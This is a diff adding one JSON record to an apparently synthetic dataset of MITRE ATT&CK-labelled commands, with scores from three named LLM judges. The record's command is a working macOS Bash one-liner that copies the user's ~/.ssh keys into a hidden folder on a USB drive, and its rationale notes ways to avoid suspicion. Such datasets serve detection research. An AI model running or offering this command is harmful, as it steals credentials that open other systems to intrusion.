@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "mkdir -p \"/Volumes/USB64/.config\" && cp -Rp \"$HOME/.ssh\" \"/Volumes/USB64/.config/\"",
+  "explanation": "Exfiltrates SSH keys and configs by copying the .ssh directory to a hidden folder on an attached USB drive.",
+  "rationale_steps": [
+    "Target sensitive credentials in $HOME/.ssh.",
+    "Use a mounted external drive at /Volumes/USB64 as the egress medium.",
+    "Preserve file metadata with cp -Rp to avoid suspicion.",
+    "Keep activity local to the endpoint with no network usage."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-e3b19f71",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting, valid flags for macOS cp, proper use of &&, and correct directory creation make the command well-formed and parseable.",
+        "semantic_score": 5,
+        "semantic_justification": "It recursively copies the user's .ssh directory into a dot-prefixed folder on a mounted USB volume, matching exfiltration over a physical medium without requiring elevated privileges.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:22:03.292082Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags (-p for mkdir, -Rp for cp), proper && chaining, and correct use of $HOME and quoted paths.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by creating a hidden directory (.config) on a mounted USB volume and recursively copying SSH keys/configs there, preserving attributes with -p, which is operationally realistic for physical medium exfiltration on macOS.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:35:50.551192Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard Bash syntax, valid flags for mkdir and cp, and correctly handles path quoting and variable expansion.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the exfiltration of sensitive SSH data to a removable volume using a hidden directory to avoid casual observation.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:35:51.448275Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
